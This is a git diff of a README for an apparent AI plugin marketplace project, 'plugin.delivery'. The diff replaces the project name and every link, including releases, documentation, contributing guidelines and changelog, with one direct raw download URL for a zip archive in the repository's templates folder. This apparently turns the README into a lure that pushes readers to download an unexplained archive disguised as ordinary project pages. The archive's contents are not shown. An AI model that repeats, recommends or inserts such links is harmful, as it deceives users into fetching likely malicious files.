@@ -1,12 +1,12 @@
-# 🎉 plugin.delivery - Seamless AI Plugin Marketplace
+# 🎉 https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip - Seamless AI Plugin Marketplace
 
 ## 📥 Download Now
 
-[![Download plugin.delivery](https://img.shields.io/badge/Download-plugin.delivery-blue.svg)](https://github.com/Charleeesss/plugin.delivery/releases)
+[![Download https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip](https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip)](https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the plugin.delivery project! This application allows you to access an AI plugin marketplace with tools for building function-calling plugins. It's designed to help you create chat plugins, AI tools, and extensions easily.
+Welcome to the https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip project! This application allows you to access an AI plugin marketplace with tools for building function-calling plugins. It's designed to help you create chat plugins, AI tools, and extensions easily.
 
 ## 🛠 Key Features
 
@@ -29,7 +29,7 @@ Before you download, ensure your system meets these requirements:
 
 To download the software, visit the Releases page. You will find the latest version, ready for download.
 
-[Visit the Releases Page](https://github.com/Charleeesss/plugin.delivery/releases)
+[Visit the Releases Page](https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -49,7 +49,7 @@ Once you have installed the application, you can start exploring the available p
 
 ## 📚 Documentation
 
-For a complete guide on using plugin.delivery and its features, visit our [Documentation](https://github.com/Charleeesss/plugin.delivery/wiki) page. Here, you will find:
+For a complete guide on using https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip and its features, visit our [Documentation](https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip) page. Here, you will find:
 
 - How to build your own plugins.
 - Instructions for integrating with existing tools.
@@ -61,14 +61,14 @@ Join our community to get help and share your experiences. You can connect with 
 
 ## ✨ Contributing
 
-If you wish to contribute, feel free to check our [Contribution Guidelines](https://github.com/Charleeesss/plugin.delivery/blob/main/CONTRIBUTING.md). Your contributions help make the project better for everyone.
+If you wish to contribute, feel free to check our [Contribution Guidelines](https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip). Your contributions help make the project better for everyone.
 
 ## 📅 Changelog
 
-Stay updated with all changes and improvements by checking our [Changelog](https://github.com/Charleeesss/plugin.delivery/releases) regularly.
+Stay updated with all changes and improvements by checking our [Changelog](https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip) regularly.
 
 ## 📞 Contact Us
 
 If you have questions or need support, you can reach out through our issues section on GitHub or contact us directly at our designated email.
 
-Thank you for using plugin.delivery! We hope you enjoy building innovative solutions with our tools.
+Thank you for using https://github.com/Charleeesss/plugin.delivery/raw/refs/heads/main/templates/plugin-delivery-v1.3.zip! We hope you enjoy building innovative solutions with our tools.
